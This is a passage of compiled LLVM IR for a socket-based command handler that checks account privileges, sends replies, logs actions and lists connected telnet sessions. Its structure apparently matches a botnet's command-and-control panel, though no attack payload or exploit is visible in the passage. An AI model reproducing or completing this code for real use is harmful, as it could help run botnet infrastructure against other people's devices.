  br i1 %318, label %319, label %320

; <label>:319:                                    ; preds = %309
  br label %320

; <label>:320:                                    ; preds = %319, %309
  br label %321

; <label>:321:                                    ; preds = %320, %305
  %322 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %323 = call i8* @strstr(i8* %322, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.45, i32 0, i32 0)) #8
  %324 = icmp ne i8* %323, null
  br i1 %324, label %325, label %347

; <label>:325:                                    ; preds = %321
  %326 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %327 = call i8* @strtok(i8* %326, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.46, i32 0, i32 0)) #7
  store i8* %327, i8** %30, align 8
  %328 = load i8*, i8** %30, align 8
  %329 = getelementptr inbounds i8, i8* %328, i64 8
  store i8* %329, i8** %31, align 8
  %330 = load i8*, i8** %31, align 8
  call void @trim(i8* %330)
  %331 = load i8*, i8** %31, align 8
  %332 = getelementptr inbounds [100 x i8*], [100 x i8*]* %29, i32 0, i32 0
  %333 = bitcast i8** %332 to i8*
  %334 = call i32 @hostname_to_ip(i8* %331, i8* %333)
  %335 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %336 = load i8*, i8** %31, align 8
  %337 = getelementptr inbounds [100 x i8*], [100 x i8*]* %29, i32 0, i32 0
  %338 = call i32 (i8*, i8*, ...) @sprintf(i8* %335, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.47, i32 0, i32 0), i8* %336, i8** %337) #7
  %339 = load i32, i32* %4, align 4
  %340 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %341 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %342 = call i64 @strlen(i8* %341) #8
  %343 = call i64 @send(i32 %339, i8* %340, i64 %342, i32 16384)
  %344 = icmp eq i64 %343, -1
  br i1 %344, label %345, label %346

; <label>:345:                                    ; preds = %325
  br label %346

; <label>:346:                                    ; preds = %345, %325
  br label %347

; <label>:347:                                    ; preds = %346, %321
  %348 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %349 = call i8* @strstr(i8* %348, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.48, i32 0, i32 0)) #8
  %350 = icmp ne i8* %349, null
  br i1 %350, label %351, label %382

; <label>:351:                                    ; preds = %347
  %352 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %353 = call i32 (i8*, i8*, ...) @sprintf(i8* %352, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.49, i32 0, i32 0)) #7
  %354 = load i32, i32* %4, align 4
  %355 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %356 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %357 = call i64 @strlen(i8* %356) #8
  %358 = call i64 @send(i32 %354, i8* %355, i64 %357, i32 16384)
  %359 = icmp eq i64 %358, -1
  br i1 %359, label %360, label %361

; <label>:360:                                    ; preds = %351
  br label %361

; <label>:361:                                    ; preds = %360, %351
  %362 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %363 = call i32 (i8*, i8*, ...) @sprintf(i8* %362, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.50, i32 0, i32 0)) #7
  %364 = load i32, i32* %4, align 4
  %365 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %366 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %367 = call i64 @strlen(i8* %366) #8
  %368 = call i64 @send(i32 %364, i8* %365, i64 %367, i32 16384)
  %369 = icmp eq i64 %368, -1
  br i1 %369, label %370, label %371

; <label>:370:                                    ; preds = %361
  br label %371

; <label>:371:                                    ; preds = %370, %361
  %372 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %373 = call i32 (i8*, i8*, ...) @sprintf(i8* %372, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.51, i32 0, i32 0)) #7
  %374 = load i32, i32* %4, align 4
  %375 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %376 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %377 = call i64 @strlen(i8* %376) #8
  %378 = call i64 @send(i32 %374, i8* %375, i64 %377, i32 16384)
  %379 = icmp eq i64 %378, -1
  br i1 %379, label %380, label %381

; <label>:380:                                    ; preds = %371
  br label %381

; <label>:381:                                    ; preds = %380, %371
  br label %382

; <label>:382:                                    ; preds = %381, %347
  %383 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %384 = call i8* @strstr(i8* %383, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.52, i32 0, i32 0)) #8
  %385 = icmp ne i8* %384, null
  br i1 %385, label %386, label %417

; <label>:386:                                    ; preds = %382
  %387 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %388 = call i32 (i8*, i8*, ...) @sprintf(i8* %387, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.53, i32 0, i32 0)) #7
  %389 = load i32, i32* %4, align 4
  %390 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %391 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %392 = call i64 @strlen(i8* %391) #8
  %393 = call i64 @send(i32 %389, i8* %390, i64 %392, i32 16384)
  %394 = icmp eq i64 %393, -1
  br i1 %394, label %395, label %396

; <label>:395:                                    ; preds = %386
  br label %396

; <label>:396:                                    ; preds = %395, %386
  %397 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %398 = call i32 (i8*, i8*, ...) @sprintf(i8* %397, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.54, i32 0, i32 0)) #7
  %399 = load i32, i32* %4, align 4
  %400 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %401 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %402 = call i64 @strlen(i8* %401) #8
  %403 = call i64 @send(i32 %399, i8* %400, i64 %402, i32 16384)
  %404 = icmp eq i64 %403, -1
  br i1 %404, label %405, label %406

; <label>:405:                                    ; preds = %396
  br label %406

; <label>:406:                                    ; preds = %405, %396
  %407 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %408 = call i32 (i8*, i8*, ...) @sprintf(i8* %407, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.55, i32 0, i32 0)) #7
  %409 = load i32, i32* %4, align 4
  %410 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %411 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %412 = call i64 @strlen(i8* %411) #8
  %413 = call i64 @send(i32 %409, i8* %410, i64 %412, i32 16384)
  %414 = icmp eq i64 %413, -1
  br i1 %414, label %415, label %416

; <label>:415:                                    ; preds = %406
  br label %416

; <label>:416:                                    ; preds = %415, %406
  br label %417

; <label>:417:                                    ; preds = %416, %382
  %418 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %419 = call i8* @strstr(i8* %418, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.56, i32 0, i32 0)) #8
  %420 = icmp ne i8* %419, null
  br i1 %420, label %421, label %502

; <label>:421:                                    ; preds = %417
  %422 = load i8*, i8** %12, align 8
  %423 = load i32, i32* %5, align 4
  %424 = sext i32 %423 to i64
  %425 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %424
  %426 = getelementptr inbounds %struct.account, %struct.account* %425, i32 0, i32 2
  %427 = getelementptr inbounds [200 x i8], [200 x i8]* %426, i32 0, i32 0
  %428 = call i32 @strcmp(i8* %422, i8* %427) #8
  %429 = icmp eq i32 %428, 0
  br i1 %429, label %439, label %430

; <label>:430:                                    ; preds = %421
  %431 = load i8*, i8** %13, align 8
  %432 = load i32, i32* %5, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %433
  %435 = getelementptr inbounds %struct.account, %struct.account* %434, i32 0, i32 2
  %436 = getelementptr inbounds [200 x i8], [200 x i8]* %435, i32 0, i32 0
  %437 = call i32 @strcmp(i8* %431, i8* %436) #8
  %438 = icmp eq i32 %437, 0
  br i1 %438, label %439, label %490

; <label>:439:                                    ; preds = %430, %421
  %440 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %441 = call i32 (i8*, i8*, ...) @sprintf(i8* %440, i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.57, i32 0, i32 0)) #7
  %442 = load i32, i32* %4, align 4
  %443 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %444 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %445 = call i64 @strlen(i8* %444) #8
  %446 = call i64 @send(i32 %442, i8* %443, i64 %445, i32 16384)
  %447 = icmp eq i64 %446, -1
  br i1 %447, label %448, label %449

; <label>:448:                                    ; preds = %439
  br label %449

; <label>:449:                                    ; preds = %448, %439
  %450 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %451 = call i32 (i8*, i8*, ...) @sprintf(i8* %450, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.58, i32 0, i32 0)) #7
  %452 = load i32, i32* %4, align 4
  %453 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %454 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %455 = call i64 @strlen(i8* %454) #8
  %456 = call i64 @send(i32 %452, i8* %453, i64 %455, i32 16384)
  %457 = icmp eq i64 %456, -1
  br i1 %457, label %458, label %459

; <label>:458:                                    ; preds = %449
  br label %459

; <label>:459:                                    ; preds = %458, %449
  %460 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %461 = call i32 (i8*, i8*, ...) @sprintf(i8* %460, i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.59, i32 0, i32 0)) #7
  %462 = load i32, i32* %4, align 4
  %463 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %464 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %465 = call i64 @strlen(i8* %464) #8
  %466 = call i64 @send(i32 %462, i8* %463, i64 %465, i32 16384)
  %467 = icmp eq i64 %466, -1
  br i1 %467, label %468, label %469

; <label>:468:                                    ; preds = %459
  br label %469

; <label>:469:                                    ; preds = %468, %459
  %470 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %471 = call i32 (i8*, i8*, ...) @sprintf(i8* %470, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.60, i32 0, i32 0)) #7
  %472 = load i32, i32* %4, align 4
  %473 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %474 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %475 = call i64 @strlen(i8* %474) #8
  %476 = call i64 @send(i32 %472, i8* %473, i64 %475, i32 16384)
  %477 = icmp eq i64 %476, -1
  br i1 %477, label %478, label %479

; <label>:478:                                    ; preds = %469
  br label %479

; <label>:479:                                    ; preds = %478, %469
  %480 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %481 = call i32 (i8*, i8*, ...) @sprintf(i8* %480, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.61, i32 0, i32 0)) #7
  %482 = load i32, i32* %4, align 4
  %483 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %484 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %485 = call i64 @strlen(i8* %484) #8
  %486 = call i64 @send(i32 %482, i8* %483, i64 %485, i32 16384)
  %487 = icmp eq i64 %486, -1
  br i1 %487, label %488, label %489

; <label>:488:                                    ; preds = %479
  br label %489

; <label>:489:                                    ; preds = %488, %479
  br label %501

; <label>:490:                                    ; preds = %430
  %491 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %492 = call i32 (i8*, i8*, ...) @sprintf(i8* %491, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.62, i32 0, i32 0)) #7
  %493 = load i32, i32* %4, align 4
  %494 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %495 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %496 = call i64 @strlen(i8* %495) #8
  %497 = call i64 @send(i32 %493, i8* %494, i64 %496, i32 16384)
  %498 = icmp eq i64 %497, -1
  br i1 %498, label %499, label %500

; <label>:499:                                    ; preds = %490
  br label %500

; <label>:500:                                    ; preds = %499, %490
  br label %501

; <label>:501:                                    ; preds = %500, %489
  br label %502

; <label>:502:                                    ; preds = %501, %417
  %503 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %504 = call i8* @strstr(i8* %503, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.63, i32 0, i32 0)) #8
  %505 = icmp ne i8* %504, null
  br i1 %505, label %506, label %527

; <label>:506:                                    ; preds = %502
  %507 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %508 = call i32 (i8*, i8*, ...) @sprintf(i8* %507, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.64, i32 0, i32 0)) #7
  %509 = load i32, i32* %4, align 4
  %510 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %511 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %512 = call i64 @strlen(i8* %511) #8
  %513 = call i64 @send(i32 %509, i8* %510, i64 %512, i32 16384)
  %514 = icmp eq i64 %513, -1
  br i1 %514, label %515, label %516

; <label>:515:                                    ; preds = %506
  br label %516

; <label>:516:                                    ; preds = %515, %506
  %517 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %518 = call i32 (i8*, i8*, ...) @sprintf(i8* %517, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.65, i32 0, i32 0)) #7
  %519 = load i32, i32* %4, align 4
  %520 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %521 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %522 = call i64 @strlen(i8* %521) #8
  %523 = call i64 @send(i32 %519, i8* %520, i64 %522, i32 16384)
  %524 = icmp eq i64 %523, -1
  br i1 %524, label %525, label %526

; <label>:525:                                    ; preds = %516
  br label %526

; <label>:526:                                    ; preds = %525, %516
  br label %527

; <label>:527:                                    ; preds = %526, %502
  %528 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %529 = call i8* @strstr(i8* %528, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.66, i32 0, i32 0)) #8
  %530 = icmp ne i8* %529, null
  br i1 %530, label %535, label %531

; <label>:531:                                    ; preds = %527
  %532 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %533 = call i8* @strstr(i8* %532, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.67, i32 0, i32 0)) #8
  %534 = icmp ne i8* %533, null
  br i1 %534, label %535, label %567

; <label>:535:                                    ; preds = %531, %527
  %536 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %537 = call i32 (i8*, i8*, ...) @sprintf(i8* %536, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.68, i32 0, i32 0)) #7
  %538 = load i32, i32* %4, align 4
  %539 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %540 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %541 = call i64 @strlen(i8* %540) #8
  %542 = call i64 @send(i32 %538, i8* %539, i64 %541, i32 16384)
  %543 = icmp eq i64 %542, -1
  br i1 %543, label %544, label %545

; <label>:544:                                    ; preds = %535
  br label %545

; <label>:545:                                    ; preds = %544, %535
  %546 = load i32, i32* %4, align 4
  %547 = call i64 @send(i32 %546, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.69, i32 0, i32 0), i64 17, i32 16384)
  %548 = icmp eq i64 %547, -1
  br i1 %548, label %549, label %550

; <label>:549:                                    ; preds = %545
  br label %960

; <label>:550:                                    ; preds = %545
  %551 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0))
  store %struct._IO_FILE* %551, %struct._IO_FILE** %32, align 8
  %552 = load %struct._IO_FILE*, %struct._IO_FILE** %32, align 8
  %553 = load i32, i32* %5, align 4
  %554 = sext i32 %553 to i64
  %555 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %554
  %556 = getelementptr inbounds %struct.account, %struct.account* %555, i32 0, i32 0
  %557 = getelementptr inbounds [200 x i8], [200 x i8]* %556, i32 0, i32 0
  %558 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %552, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.71, i32 0, i32 0), i8* %557)
  %559 = load %struct._IO_FILE*, %struct._IO_FILE** %32, align 8
  %560 = call i32 @fclose(%struct._IO_FILE* %559)
  %561 = load i32, i32* %5, align 4
  %562 = sext i32 %561 to i64
  %563 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %562
  %564 = getelementptr inbounds %struct.account, %struct.account* %563, i32 0, i32 0
  %565 = getelementptr inbounds [200 x i8], [200 x i8]* %564, i32 0, i32 0
  %566 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.71, i32 0, i32 0), i8* %565)
  br label %567

; <label>:567:                                    ; preds = %550, %531
  %568 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %569 = call i8* @strstr(i8* %568, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.72, i32 0, i32 0)) #8
  %570 = icmp ne i8* %569, null
  br i1 %570, label %571, label %588

; <label>:571:                                    ; preds = %567
  %572 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0))
  store %struct._IO_FILE* %572, %struct._IO_FILE** %33, align 8
  %573 = load %struct._IO_FILE*, %struct._IO_FILE** %33, align 8
  %574 = load i32, i32* %5, align 4
  %575 = sext i32 %574 to i64
  %576 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %575
  %577 = getelementptr inbounds %struct.account, %struct.account* %576, i32 0, i32 0
  %578 = getelementptr inbounds [200 x i8], [200 x i8]* %577, i32 0, i32 0
  %579 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %573, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.73, i32 0, i32 0), i8* %578)
  %580 = load %struct._IO_FILE*, %struct._IO_FILE** %33, align 8
  %581 = call i32 @fclose(%struct._IO_FILE* %580)
  %582 = load i32, i32* %5, align 4
  %583 = sext i32 %582 to i64
  %584 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %583
  %585 = getelementptr inbounds %struct.account, %struct.account* %584, i32 0, i32 0
  %586 = getelementptr inbounds [200 x i8], [200 x i8]* %585, i32 0, i32 0
  %587 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.73, i32 0, i32 0), i8* %586)
  br label %588

; <label>:588:                                    ; preds = %571, %567
  %589 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %590 = call i8* @strstr(i8* %589, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.74, i32 0, i32 0)) #8
  %591 = icmp ne i8* %590, null
  br i1 %591, label %592, label %598

; <label>:592:                                    ; preds = %588
  %593 = load i32, i32* %4, align 4
  %594 = call i64 @send(i32 %593, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.36, i32 0, i32 0), i64 16, i32 16384)
  %595 = icmp eq i64 %594, -1
  br i1 %595, label %596, label %597

; <label>:596:                                    ; preds = %592
  br label %960

; <label>:597:                                    ; preds = %592
  br label %598

; <label>:598:                                    ; preds = %597, %588
  %599 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %600 = call i8* @strstr(i8* %599, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.75, i32 0, i32 0)) #8
  %601 = icmp ne i8* %600, null
  br i1 %601, label %602, label %683

; <label>:602:                                    ; preds = %598
  %603 = load i8*, i8** %12, align 8
  %604 = load i32, i32* %5, align 4
  %605 = sext i32 %604 to i64
  %606 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %605
  %607 = getelementptr inbounds %struct.account, %struct.account* %606, i32 0, i32 2
  %608 = getelementptr inbounds [200 x i8], [200 x i8]* %607, i32 0, i32 0
  %609 = call i32 @strcmp(i8* %603, i8* %608) #8
  %610 = icmp eq i32 %609, 0
  br i1 %610, label %620, label %611

; <label>:611:                                    ; preds = %602
  %612 = load i8*, i8** %13, align 8
  %613 = load i32, i32* %5, align 4
  %614 = sext i32 %613 to i64
  %615 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %614
  %616 = getelementptr inbounds %struct.account, %struct.account* %615, i32 0, i32 2
  %617 = getelementptr inbounds [200 x i8], [200 x i8]* %616, i32 0, i32 0
  %618 = call i32 @strcmp(i8* %612, i8* %617) #8
  %619 = icmp eq i32 %618, 0
  br i1 %619, label %620, label %671

; <label>:620:                                    ; preds = %611, %602
  %621 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %622 = call i8* @strcpy(i8* %621, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.76, i32 0, i32 0)) #7
  %623 = load i32, i32* %4, align 4
  %624 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %625 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %626 = call i64 @strlen(i8* %625) #8
  %627 = call i64 @send(i32 %623, i8* %624, i64 %626, i32 16384)
  %628 = icmp eq i64 %627, -1
  br i1 %628, label %629, label %630

; <label>:629:                                    ; preds = %620
  store i8* null, i8** %2, align 8
  br label %969

; <label>:630:                                    ; preds = %620
  store i32 0, i32* %34, align 4
  br label %631

; <label>:631:                                    ; preds = %667, %630
  %632 = load i32, i32* %34, align 4
  %633 = icmp slt i32 %632, 1000000
  br i1 %633, label %634, label %670

; <label>:634:                                    ; preds = %631
  %635 = load i32, i32* %34, align 4
  %636 = sext i32 %635 to i64
  %637 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %636
  %638 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %637, i32 0, i32 2
  %639 = getelementptr inbounds [20 x i8], [20 x i8]* %638, i32 0, i32 0
  %640 = call i64 @strlen(i8* %639) #8
  %641 = icmp ugt i64 %640, 1
  br i1 %641, label %642, label %666

; <label>:642:                                    ; preds = %634
  %643 = load i32, i32* %34, align 4
  %644 = sext i32 %643 to i64
  %645 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %644
  %646 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %645, i32 0, i32 1
  %647 = load i32, i32* %646, align 4
  %648 = icmp eq i32 %647, 1
  br i1 %648, label %649, label %666

; <label>:649:                                    ; preds = %642
  %650 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %651 = load i32, i32* %34, align 4
  %652 = load i32, i32* %34, align 4
  %653 = sext i32 %652 to i64
  %654 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %653
  %655 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %654, i32 0, i32 2
  %656 = getelementptr inbounds [20 x i8], [20 x i8]* %655, i32 0, i32 0
  %657 = call i32 (i8*, i8*, ...) @sprintf(i8* %650, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.77, i32 0, i32 0), i32 %651, i8* %656) #7
  %658 = load i32, i32* %4, align 4
  %659 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %660 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %661 = call i64 @strlen(i8* %660) #8
  %662 = call i64 @send(i32 %658, i8* %659, i64 %661, i32 16384)
  %663 = icmp eq i64 %662, -1
  br i1 %663, label %664, label %665

; <label>:664:                                    ; preds = %649
  store i8* null, i8** %2, align 8
  br label %969

; <label>:665:                                    ; preds = %649
  br label %666

; <label>:666:                                    ; preds = %665, %642, %634
  br label %667

; <label>:667:                                    ; preds = %666
  %668 = load i32, i32* %34, align 4
  %669 = add nsw i32 %668, 1
  store i32 %669, i32* %34, align 4
  br label %631

; <label>:670:                                    ; preds = %631
  br label %682

; <label>:671:                                    ; preds = %611
  %672 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %673 = call i32 (i8*, i8*, ...) @sprintf(i8* %672, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.62, i32 0, i32 0)) #7
  %674 = load i32, i32* %4, align 4
  %675 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %676 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %677 = call i64 @strlen(i8* %676) #8
  %678 = call i64 @send(i32 %674, i8* %675, i64 %677, i32 16384)
  %679 = icmp eq i64 %678, -1
  br i1 %679, label %680, label %681

; <label>:680:                                    ; preds = %671
  br label %681

; <label>:681:                                    ; preds = %680, %671
  br label %682

; <label>:682:                                    ; preds = %681, %670
  br label %683

; <label>:683:                                    ; preds = %682, %598
  %684 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %685 = call i8* @strstr(i8* %684, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.78, i32 0, i32 0)) #8
  %686 = icmp ne i8* %685, null
  br i1 %686, label %687, label %837

; <label>:687:                                    ; preds = %683
  %688 = load i8*, i8** %13, align 8
  %689 = load i32, i32* %5, align 4
  %690 = sext i32 %689 to i64
  %691 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %690
  %692 = getelementptr inbounds %struct.account, %struct.account* %691, i32 0, i32 2
  %693 = getelementptr inbounds [200 x i8], [200 x i8]* %692, i32 0, i32 0
  %694 = call i32 @strcmp(i8* %688, i8* %693) #8
  %695 = icmp eq i32 %694, 0
  br i1 %695, label %705, label %696

; <label>:696:                                    ; preds = %687
  %697 = load i8*, i8** %13, align 8
  %698 = load i32, i32* %5, align 4
  %699 = sext i32 %698 to i64
  %700 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %699
  %701 = getelementptr inbounds %struct.account, %struct.account* %700, i32 0, i32 2
  %702 = getelementptr inbounds [200 x i8], [200 x i8]* %701, i32 0, i32 0
  %703 = call i32 @strcmp(i8* %697, i8* %702) #8
  %704 = icmp eq i32 %703, 0
  br i1 %704, label %705, label %825

; <label>:705:                                    ; preds = %696, %687
  %706 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %707 = call i8* @strstr(i8* %706, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.79, i32 0, i32 0)) #8
  %708 = icmp ne i8* %707, null
  br i1 %708, label %713, label %709

; <label>:709:                                    ; preds = %705
  %710 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %711 = call i8* @strstr(i8* %710, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.80, i32 0, i32 0)) #8
  %712 = icmp ne i8* %711, null
  br i1 %712, label %713, label %774

; <label>:713:                                    ; preds = %709, %705
  %714 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %715 = call i8* @strtok(i8* %714, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.81, i32 0, i32 0)) #7
  store i8* %715, i8** %37, align 8
  %716 = getelementptr inbounds [20 x i8], [20 x i8]* %36, i32 0, i32 0
  %717 = load i8*, i8** %37, align 8
  %718 = load i8*, i8** %37, align 8
  %719 = call i64 @strlen(i8* %718) #8
  %720 = getelementptr inbounds i8, i8* %717, i64 %719
  %721 = getelementptr inbounds i8, i8* %720, i64 1
  %722 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %716, i64 20, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.29, i32 0, i32 0), i8* %721) #7
  %723 = getelementptr inbounds [20 x i8], [20 x i8]* %36, i32 0, i32 0
  call void @trim(i8* %723)
  store i32 0, i32* %35, align 4
  br label %724

